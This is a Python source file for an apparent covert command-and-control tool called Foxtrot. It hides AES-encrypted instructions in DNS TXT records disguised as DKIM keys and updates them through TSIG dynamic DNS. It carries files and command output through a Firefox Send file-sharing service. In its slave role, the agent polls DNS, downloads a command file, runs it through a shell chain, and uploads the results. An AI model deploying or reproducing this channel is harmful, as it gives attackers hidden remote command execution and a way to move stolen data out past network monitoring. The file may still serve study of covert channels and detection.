from os import rename, path
from io import BytesIO
from random import randint
from time import sleep
import json
import tempfile
import os
import threading

from foxtrot.fconcmd import FConCommander

# DNS Resolver
import dns.resolver
import dns.update
import dns.query
import dns.tsigkeyring
from dns.tsig import HMAC_SHA256

# Crypto / encoding
from Cryptodome.Cipher import AES
from base64 import urlsafe_b64encode, urlsafe_b64decode

# FF Send-cli
# special thanks to https://github.com/ehuggett/send-cli
import sendclient.common
import sendclient.download
import sendclient.upload

# OS exec
# git clone  https://github.com/kennethreitz/delegator.py ; python setup.py install
import delegator


class Foxtrot:
    def __init__(self, config, logger):

        self.flogger = logger
        self.fconfig = config

        # Set DNS Resolver this is important so we query the nsserver directly,
        # and not caching servers default on the OS.
        # Otherwise propagation and TTLs may be in the way and give mixed results
        # when trying to update/add/delete records
        dns.resolver.default_resolver = dns.resolver.Resolver(configure=False)
        dns.resolver.default_resolver.nameservers = [self.fconfig['nssrv']]

    def fx_agent_dynrec(self, operation, domain, nssrv, selector, ttl, payload_b64, **tsig):
        """ Manage Agent Dynamic DNS Record: CRUD"""

        self.flogger.debug("Accepted for record: {0}, {1}, {2}, {3}, {4}, {5}, {6}".format(
            operation, domain, nssrv, selector, ttl, payload_b64, tsig))

        keyring = dns.tsigkeyring.from_text(tsig)

        self.flogger.debug("DNS TSIG Keyring: " + str(keyring))
        update = dns.update.Update(domain, keyring=keyring, keyalgorithm=HMAC_SHA256)
        self.flogger.debug("DNS TXT Update: " + str(update))

        # Make DKIM record look normal
        dkim_record = '"v=DKIM1; h=sha256; k=rsa; t=y; s=email; p={0}"'.format(payload_b64)

        # From http://www.dnspython.org/docs/1.14.0/dns.update.Update-class.html#add
        if operation == 'add':
            self.flogger.debug("DNS: Adding TXT record")
            update.add(selector, ttl, dns.rdatatype.TXT, dkim_record)
        else:
            if operation == 'update':
                self.flogger.debug("DNS: Updating TXT record")
                update.replace(selector, ttl, dns.rdatatype.TXT, dkim_record)
            else:
                if operation == 'delete':
                    self.flogger.debug("DNS: Deleting TXT record")
                    update.delete(selector)
                else:
                    self.flogger.error("DNS: Invalid record action: " + operation)
                    raise ValueError("Operation must be one of <add|update|delete>")

        try:
            response = dns.query.tcp(update, nssrv, timeout=10)
            if response.rcode() == 0:
                self.flogger.debug("DynDNS: Update Successful")
                return True
            else:
                self.flogger.error("DynDNS: Update failed: code: {0}".format(response.rcode()))
                self.flogger.error("Response: {0}".format(response))
                return False
        except dns.tsig.PeerBadKey as peerkey:
            self.flogger.error("DNS TSIG: Bad Peer key {0}".format(peerkey))
            return False
        except Exception as e:
            self.flogger.error("DNS: General Exception {0}".format(e))
            return False

        # After you add/update the record you can query the NS:
        # Ex: dig  @ns1.domain txt  selector._domainkey.domain
        # If you omit the @ns then DNS routing rules to get to
        # your DNS via default resolver cache will apply

    def fx_agent_ident(self, key, domain):
        """ Return Agent identification """

        return ".".join([key, "_domainkey", domain])

    def fx_check_agent(self, key, domain):
        """ Find and return DKIM selector for an agent if exists """

        fqdnselector = self.fx_agent_ident(key, domain)
        answer = None

        try:
            answers = dns.resolver.query(fqdnselector, 'TXT')

            if len(answers) != 1:
                answer = answers[0]
            else:
                answer = answers
            self.flogger.debug("DNS Agent via record: {0}, TTL: {1}".format(
                answer.qname, answer.rrset.ttl))

        except dns.resolver.NXDOMAIN as nxdome:
            self.flogger.debug("DNS Resolver exception: {0}".format(nxdome))
            return answer

        return answer

    def fx_check_payload(self, key, domain):
        """Return DKIM payload verbatim for inspection """

        data = ""
        answer = self.fx_check_agent(key, domain)
        
        if answer is not None:
            for rdata in answer:
                for txt in rdata.strings:
                    data = txt
        return data

    def fx_get_payload(self, key, domain):
        """ Get Instruction from DNS Store"""

        data = self.fx_check_payload(key, domain)
        # Check data for validity
        self.flogger.debug("DNS Record Content: {0} ".format(data))
        dkim_rec = str(data).split(";")
        payload_holder = dkim_rec[-1].strip()
        self.flogger.debug("DNS Payload holder: " + payload_holder)
        payload_b64 = payload_holder.split("p=")[-1]
        self.flogger.debug("DNS Payload (B64 data): " + payload_b64)
        recv_data = self.fx_pdec(key, payload_b64)
        self.flogger.debug("Payload (decrypted data): " + recv_data)

        return recv_data

    def fx_penc(self, key, data):
        """ Encrypt data w/key """

        cipher = AES.new(key.encode(), AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())

        self.flogger.debug("ENC: Ciphertext type: {0}".format(type(ciphertext)))
        self.flogger.debug("ENC: Ciphertext: {0}".format(str(ciphertext)))

        # Use common format cross platform
        ciphertext_b64 = urlsafe_b64encode(ciphertext)
        self.flogger.debug("ENC: Ciphertext(b64): {0}".format(ciphertext_b64) )

        self.flogger.debug("ENC: Nonce type: {0}".format(type(cipher.nonce)))
        self.flogger.debug("ENC: Nonce: {0}".format(str(cipher.nonce)))

        nonce_b64 = urlsafe_b64encode(cipher.nonce)
        self.flogger.debug("ENC: Nonce(b64): {0}".format(nonce_b64))

        self.flogger.debug("ENC: Tag type: {0}".format(type(tag)))
        self.flogger.debug("ENC: Tag: {0}".format( str(tag)))

        tag_b64 = urlsafe_b64encode(tag)
        self.flogger.debug("ENC: Tag (B64) : {0}".format(tag_b64))

        payload = b''.join([cipher.nonce, tag, ciphertext])
        payload_b64 = urlsafe_b64encode(payload)

        payload_b64_ascii = payload_b64.decode('ascii')
        self.flogger.debug("ENC: Record payload (ASCII) : {0}".format(payload_b64_ascii))

        return payload_b64_ascii

    def fx_pdec(self, key, payload_b64_ascii):
        """ Decrypt encoded and encrypted payload w/key """

        payload = urlsafe_b64decode(payload_b64_ascii)
        payload_stream = BytesIO(payload)
        
        nonce, tag, ciphertext = [payload_stream.read(x) for x in (16, 16, -1)]
        
        self.flogger.debug("DEC: Nonce type: {0}".format(type(nonce)))
        self.flogger.debug("DEC: Nonce: {0}".format(str(nonce)))

        cipher = AES.new(key.encode(), AES.MODE_EAX, nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)

        # This is dependent on how it was encoded  by the origin
        originaldata = data.decode('ascii')

        return originaldata

    def fx_selector_from_key(self, key, domain, fqdn=False):
        """ Build DKIM selector from key"""

        if not fqdn:
            selector = ".".join([key, "_domainkey"])
        else:
            selector = ".".join([key, "_domainkey", domain])

        return selector

    def fx_send_file(self, service, sfile):
        """ Send file the send service via sendlclient """

        self.flogger.debug('SF: Uploading "' + sfile.name + '"')
        # Ignore potentially incompatible version of server. Turn `ignoreVersion to True` to care
        ffsend_link, fileId, delete_token = sendclient.upload.send_file(
                            service, sfile, ignoreVersion=True, fileName=None)

        self.flogger.debug('SF: File Uploaded, use the following link to retrieve it')
        self.flogger.debug("SF: Link: {0}, FileId: {1}, Delete file with key: {2}".format(
            ffsend_link,fileId, delete_token))
        self.flogger.debug(ffsend_link)

        return ffsend_link

    def fx_url_to_file(self, url, dfile=None, temp=False):
        """ Get URL from the send service via sendlclient """

        # Ignore potentially incompatible version of server. Turn `ignoreVersion to True` to care
        tmpfile, suggested_name = sendclient.download.send_urlToFile(url, ignoreVersion=True)
        print("Suggested name: ", suggested_name)
        self.flogger.debug('SF: Downloaded {0} -> {1}'.format(url, tmpfile.name))

        if dfile is not None:
            self.flogger.debug("SF: Renaming and Saving {0} -> {1}".format(tmpfile.name, dfile.name))
            rename(tmpfile.name, dfile.name)
            return path.abspath(dfile.name)
        else:
            if not temp:
                self.flogger.debug("SF: Renaming and Saving {0} -> {1}".format(tmpfile.name, suggested_name))
                try:
                    rename(tmpfile.name, suggested_name)
                    return path.abspath(suggested_name)
                except OSError as ose:
                    print("Unable to save file {} : \nLeaving it under `unknown` ".format(
                        suggested_name, ose))
                    suggested_name = "unknown"
                    rename(tmpfile.name, suggested_name)
                    return path.abspath(suggested_name)

            else:
                fd, tf = tempfile.mkstemp()
                rename(tmpfile.name, tf)
                return path.abspath(tf)

    def agent_peek(self):
        """ Peek: See unwrapped and decrypted payload """

        if hasattr(self.fconfig['args'], 'interval_low') and \
            hasattr(self.fconfig['args'], 'interval_high') and \
                (self.fconfig['args'].interval_low > 0 or self.fconfig['args'].interval_high > 0):
                while True:
                    data = self.fx_get_payload(self.fconfig['key'], self.fconfig['domain'])
                    self.flogger.info(data)
                    sleep(randint(self.fconfig['args'].interval_low,
                                  self.fconfig['args'].interval_high))
        elif 'peek_watch' in self.fconfig:
            while True:
                data = self.fx_get_payload(self.fconfig['key'], self.fconfig['domain'])
                self.flogger.info(data)
                sleep(int(self.fconfig['watch']))
        else:
            data = self.fx_get_payload(self.fconfig['key'], self.fconfig['domain'])

        return data

    def agent_ident(self):
        """ Ident: Identify agent in DNS """
        data = "Agent: ID:{0} >> RR:{1} @{2} ".format(
            self.fconfig['agent'].decode(),
            self.fx_agent_ident(self.fconfig['key'], self.fconfig['domain']),
            self.fconfig['nssrv'] )
        return data

    def agent_show(self):
        """ Show:  Show DNS record value (wrapped and encrypted payload) """
        data = self.fx_check_payload(self.fconfig['key'], self.fconfig['domain'])
        return data

    def agent_check(self):
        """Check if agent record exists, and if not - notify and bail"""

        record = self.fx_check_agent(self.fconfig['key'], self.fconfig['domain'])
        if record is None:
            self.flogger.warning("FX: Agent {0} not known to the system (key: {1})".format(
                self.fconfig['agent'].decode(), self.fconfig['key']))
            self.flogger.warning("FX: Invoke `agent` action with `--operation generate` option")

    def agent_reset(self):

        msgMeta = {'t': 's', 's': 'W', 'c': '', 'u': ''}
        record = self.fx_check_agent(self.fconfig['key'], self.fconfig['domain'])

        if record is not None:
            jmsgMeta = json.dumps(msgMeta, separators=(',', ':'))
            payload_b64 = self.fx_penc(self.fconfig['key'], jmsgMeta)
            self.fx_agent_dynrec("update", self.fconfig['domain'], self.fconfig['nssrv'],
                             self.fx_selector_from_key(self.fconfig['key'], self.fconfig['domain']),
                             self.fconfig['ttl'], payload_b64, **self.fconfig['tsig'])
        else:
            self.flogger.warning("FX: Agent record {0} does not exist. Create it first".format(
                self.fconfig['agent'].decode()))

    def agent_generate(self):
        """Check if agent record exists, and if not - generate one"""

        record = self.fx_check_agent(self.fconfig['key'], self.fconfig['domain'])

        if record is not None:
            self.flogger.error("FX: Agent record already exists. Delete it first")
            self.flogger.error("FX: Agent record is: {0} >> {1} @{2} ".format(
                self.fconfig['agent'].decode(),
                self.fx_agent_ident(self.fconfig['key'], self.fconfig['domain']),
                self.fconfig['nssrv'],
            ))
        else:
            self.flogger.warning("FX: New Agent record {0} will be GENERATED.".format(
                self.fconfig['agent'].decode()))

            msgMeta = {'t': 's', 's': 'W', 'c': '', 'u': ''}
            jmsgMeta = json.dumps(msgMeta, separators=(',', ':'))

            payload_b64 = self.fx_penc(self.fconfig['key'], jmsgMeta)
            self.fx_agent_dynrec("add", self.fconfig['domain'], self.fconfig['nssrv'],
                                 self.fx_selector_from_key(self.fconfig['key'], self.fconfig['domain']),
                                 self.fconfig['ttl'], payload_b64, **self.fconfig['tsig'])

    def agent_delete(self):
        """Delete agent record"""

        record = self.fx_check_agent(self.fconfig['key'], self.fconfig['domain'])

        if record is not None:
            self.flogger.warning("FX: Agent record {0} will be DELETED ".format(
                self.fconfig['agent'].decode()))
            self.flogger.warning("FX: Agent: {0} >> {1} @{2} ".format(
                self.fconfig['agent'].decode(),
                self.fx_agent_ident(self.fconfig['key'], self.fconfig['domain']),
                self.fconfig['nssrv'],
            ))
            payload_b64 = self.fx_penc(self.fconfig['key'], "Not important, deleted")
            self.fx_agent_dynrec("delete", self.fconfig['domain'], self.fconfig['nssrv'],
                                 self.fx_selector_from_key(self.fconfig['key'], self.fconfig['domain']),
                                 self.fconfig['ttl'], payload_b64, **self.fconfig['tsig'])
        else:
            self.flogger.error("FX: Agent record does not exist.")

    def _action_recv_master(self, agent_job):

        # Process instruction metadata
        # Process type response
        if agent_job["t"].lower() == "s":
            self.flogger.debug("Response received.")

            # Fetch instructions from FFSend url
            job_url = agent_job['u']
            self.flogger.debug("Job Response Content URL: {0}".format(job_url))

            # no URL posted from agent
            if job_url == "":
                return

            fpath = self.fx_url_to_file(job_url, temp=True)
            self.flogger.debug("Find downloaded response file in: " + fpath)

            # Determine how to process downloaded file

            # 'o' - output from command: cat to stdout
            if agent_job["c"].lower() == "o":
                with open(fpath, mode="rb") as cf:
                    print(cf.read().decode('utf-8'))
                os.remove(fpath)

            # TODO: Notify agent of a pickup by master
            self.agent_reset()

        elif agent_job["t"].lower() == "q":
            self.flogger.debug("Request received. But your Role is Master.")
        else:
            self.flogger.error("Invalid Instruction: Not a request | response type")

    def _action_recv_slave(self, agent_job):


        # Process instruction metadata
        # Process type request
        if agent_job["t"].lower() == "q":
            self.flogger.debug("Request received")

            # Fetch instructions from FFSend url
            job_url = agent_job['u']
            self.flogger.debug("Job URL: {0}".format(type(job_url)))

            if job_url is None:
                return

            # TODO: Implement data file download
            if agent_job["c"].lower() == "f":
                self.flogger.debug("Request received: data file download")
                fpath = self.fx_url_to_file(job_url)
                self.flogger.debug("Data file fetched: {}".format(fpath))

                # Update DNS record meta only. Download of content only, no output
                self.action_send_response("AWAIT", 'o', None, True)

            if agent_job["c"].lower() == "o":
                self.flogger.debug("Request received: external command exec()")

                # Update DNS record meta only. Processing
                self.flogger.debug("Setting ABUSY flag in record")
                self.action_send_response("ABUSY", 'o', None, True)

                fpath = self.fx_url_to_file(job_url, temp=True)
                self.flogger.debug("Reading from: {}".format(fpath))

                with open(fpath, mode="rb") as cf:
                    instructions = cf.read().decode('utf-8')
                os.remove(fpath)

                self.flogger.info("\n==> Request: ({}) <==".format(instructions))
                self.flogger.debug("Instructions requested: \n{0}".format(instructions))

                # Run command(s) from file
                c = delegator.chain(instructions)
                cout = c.out

                output = "\n".encode('ascii') + cout.encode('ascii', 'replace')

                # Update DNS record with results
                print("<== Response posted ==>\n")
                self.action_send_response("AWAIT", 'o', output)

            # TODO: Implement internal agent commands
            if agent_job["c"].lower() == "m":
                self.flogger.debug("Request received: internal command")
                self.flogger.error("NOT IMPLEMENTED")

        elif agent_job["t"].lower() == "s":
            self.flogger.debug("Response received. But your Role is Slave.")
        else:
            self.flogger.error("Invalid Instruction: Not a request | response type")

    def action_recv(self):
        """
        1. Receive data from DNS Store.
        2. Follow processing instructions.
        3. Update DNS Store record with response
        """

        # Receive instruction data
        recv_data = self.agent_peek()
        self.flogger.debug("FX: Received Unwrapped data: {0}".format(recv_data))

        agent_job = json.loads(recv_data)
        self.flogger.debug("Agent job: {0}".format(agent_job))

        if self.fconfig['verbose'] == 'debug':
            for k, v in agent_job.items():
                self.flogger.debug("{0} : {1}".format(k, v))

        # process as slave
        if self.fconfig['role'] == 'slave':
            # Agent will only process jobs in SJOB(J) state
            if agent_job["s"].upper() != "J":
                self.flogger.info("No Job posted for agent")
                self.flogger.debug("Record Data: {}".format(recv_data))
                return
            self._action_recv_slave(agent_job)

        # process as master
        if self.fconfig['role'] == 'master':
            # Agent will only process jobs not in ABUSY(B) or AWAIT(W) states
            if agent_job["s"].upper() != "W":
                self.flogger.info("Agent is busy or pending job pick up.")
                self.flogger.debug("Record Data: {}".format(recv_data))
                return
            self._action_recv_master(agent_job)

    def action_send_response(self, jobstate, response_type, dmsgcontent=None, metaonly=False):
        """ Send response to Store"""
        ffsend_link = ""
        msgMeta=None

        # set state to AWAIT (free) or ABUSY (processing)
        if jobstate == "AWAIT":
            msgMeta = {'t': 's', 's': 'W', 'c': '', 'u': ''}

        if jobstate == "ABUSY":
            msgMeta = {'t': 's', 's': 'B', 'c': '', 'u': ''}

        # TODO: Implement file exfil
        if response_type == 'o': # output command
            msgMeta['c'] = 'o'

        if not metaonly:
            if dmsgcontent is not None:
                with tempfile.NamedTemporaryFile() as tf:
                    tf.write(dmsgcontent)
                    tf.seek(0)
                    ffsend_link = self.fx_send_file(self.fconfig['service'], tf)
                    self.flogger.debug("Serve: Retrieve response at: " + ffsend_link)
                msgMeta['u'] = ffsend_link

        # package metadata
        jmsgMeta = json.dumps(msgMeta, separators=(',', ':'))
        payload_b64 = self.fx_penc(self.fconfig['key'], jmsgMeta)
        self.fx_agent_dynrec("update", self.fconfig['domain'], self.fconfig['nssrv'],
                             self.fx_selector_from_key(self.fconfig['key'], self.fconfig['domain']),
                             self.fconfig['ttl'], payload_b64, **self.fconfig['tsig'])

    def action_send_file(self, dfh, meta):
        """ Send file to Frefox Send service"""
        ffsend_link = ""
        ffsend_link = self.fx_send_file(self.fconfig['service'], dfh)
        self.flogger.debug("Retrieve with: " + ffsend_link)

        meta['u'] = ffsend_link
        jmeta = json.dumps(meta, separators=(',', ':'))
        payload_b64 = self.fx_penc(self.fconfig['key'], jmeta)
        self.fx_agent_dynrec("update", self.fconfig['domain'], self.fconfig['nssrv'],
                             self.fx_selector_from_key(self.fconfig['key'], self.fconfig['domain']),
                             self.fconfig['ttl'], payload_b64, **self.fconfig['tsig'])

    def action_send_cmd(self, meta, content):
        """ Convert command to file"""
        with tempfile.NamedTemporaryFile() as tf:
            tf.write(content)
            tf.seek(0)
            self.action_send_file(tf, meta)

    def action_send_data_file(self, dfh):
        """ Send data file to Agent """
        msgMeta = {'t': 'q', 's': 'J', 'c': 'f', 'u': ''}
        self.action_send_file(dfh, msgMeta)

    def action_send_ocmd_file(self, dfh):
        """" Send file wth command for execution to Agent """
        msgMeta = {'t': 'q', 's': 'J', 'c': 'o', 'u': ''}
        self.action_send_file(dfh, msgMeta)

    def action_send_ocmd(self, dmsgcontent):
        """ Send <external> command for execution to Agent """
        msgMeta = {'t': 'q', 's': 'J', 'c': 'o', 'u': ''}
        self.action_send_cmd(msgMeta, dmsgcontent)

    def action_send_mcmd(self, dmsgcontent):
        """ Send <internal> command for execution to Agent """
        msgMeta = {'t': 'q', 's': 'J', 'c': 'm', 'u': ''}
        self.action_send_cmd(msgMeta, dmsgcontent)

    def action_console(self):
        """ Enter console """
        print('Starting Command server, use <Ctrl-D> , `q`, `quit` to quit')
        cst = threading.Thread(target=self.cmdservice_worker, args=(self.fconfig, self))
        cst.start()

    def cmdservice_worker(self, fconfig, fox):
        fcc = FConCommander(fconfig, fox)
        fcc.do_loop()

    def fpath2fh(self, fpath):
        if os.path.exists(fpath) and os.path.isfile(fpath):
            try:
                fh = open(fpath, 'rb')
            except IOError as ioe:
                self.flogger.error("File {} could not be opened: {}".format(fpath, ioe ))
                print("File {} could not be opened: {}".format(fpath, ioe ))
                return None
            return fh
        else:
            self.flogger.error("Path {} does not exist".format(fpath))
            print("Path {} does not exist".format(fpath))
            return None


